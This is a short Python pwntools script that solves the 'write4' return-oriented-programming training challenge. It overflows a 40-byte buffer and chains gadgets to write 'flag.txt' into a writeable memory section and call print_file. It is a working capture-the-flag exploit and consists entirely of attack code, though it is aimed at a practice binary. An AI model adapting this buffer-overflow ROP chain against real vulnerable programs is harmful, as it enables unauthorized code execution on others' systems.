from pwn import *

context.arch = "amd64"
context.log_level = "critical"

rdiGadget = 0x0000000000400693
printFileGadget = 0x0000000000400620
popGadget = 0x0000000000400690 # pop r14; pop r15; ret;
movGadget = 0x0000000000400628 # $R15 -> R14
writeableSection  = 0x0000000000601028


elf = ELF("./write4")
lib = ELF("./libwrite4.so")
p = elf.process()
#p = gdb.debug("./write4", "b main\nc")

rop = ROP(elf)
rop.raw(b"A"*(40))

rop.raw(p64(popGadget))
rop.raw(p64(writeableSection))
rop.raw(b"flag.txt")
rop.raw(p64(movGadget))

rop.raw(p64(rdiGadget))
rop.raw(p64(writeableSection))
rop.raw(p64(printFileGadget))

print(p.recvuntil("> ").decode("utf-8"))

p.sendline(rop.chain())

print(p.recvall().decode("utf-8"))

